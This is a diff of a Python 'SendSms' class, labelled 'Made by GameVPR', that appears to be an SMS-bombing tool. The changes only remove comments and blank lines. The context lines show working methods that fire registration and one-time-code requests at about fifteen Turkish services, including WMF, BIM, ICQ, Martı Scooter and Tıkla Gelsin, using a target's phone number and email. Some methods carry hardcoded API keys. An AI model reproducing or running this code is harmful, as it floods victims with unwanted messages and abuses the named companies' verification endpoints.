@@ -30,8 +30,7 @@ class SendSms():
         except:    
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Kahve Dünyası")
         
-     
-    #wmf.com.tr
+
     def Wmf(self):
         try:
             wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
@@ -67,9 +66,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Tıkla Gelsin")
-    
-
-    #ayyildiz.com.tr
     def Ayyildiz(self):
         try:
             url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
@@ -82,9 +78,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Altın Yıldız Classics")
-
-
-    #naosstars.com
     def Naosstars(self):
         try:
             url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
@@ -98,9 +91,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> NAOS")
-
-
-    #bim
     def Bim(self):
         try:
             bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
@@ -111,9 +101,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> BIM")
-
-
-    #englishhome.com
     def Englishhome(self):
         try:
             data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
@@ -125,10 +112,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> English Home")
-    
-
-
-    #icq.net
     def Icq(self):
         try:
             url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
@@ -141,12 +124,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> ICQ")
-          
-
-    
-    
-   
-    #evidea.com
     def Evidea(self):
         try:
             url = "https://www.evidea.com:443/users/register/"
@@ -160,9 +137,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> EvIdea") 
-            
-        
-    #marti.tech
     def Marti(self):
         try:
             url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
@@ -175,9 +149,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Martı Scooter")
-
-
-    #heyscooter.com.tr
     def Hey(self):
         try:
             url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
@@ -190,9 +161,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Hey Mobility")
-
-
-    #bineq.tech
     def Bineq(self):
         try:
             url = f"https://bineqapi.heymobility.tech:443/V3//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
@@ -205,11 +173,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Bineq Scooter")
-
-        
-   
-   
-    #tiklagelsin.com
     def TiklaGelsin(self):
         try:
             url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
@@ -223,12 +186,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Tıkla Gelsin")
-    
-
-    
-   
-   
-    #tasimacim.com
     def Tasimacim(self):
         try:
             url = "https://server.tasimacim.com/requestcode"
@@ -241,10 +198,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Taşımacım")
-    
-    
-    
-    #yuffi.co
     def Yuffi(self):
         try:
             url = "https://api.yuffi.co/api/parent/login/user"
@@ -257,6 +210,3 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Yuffi")
-            
-
-  
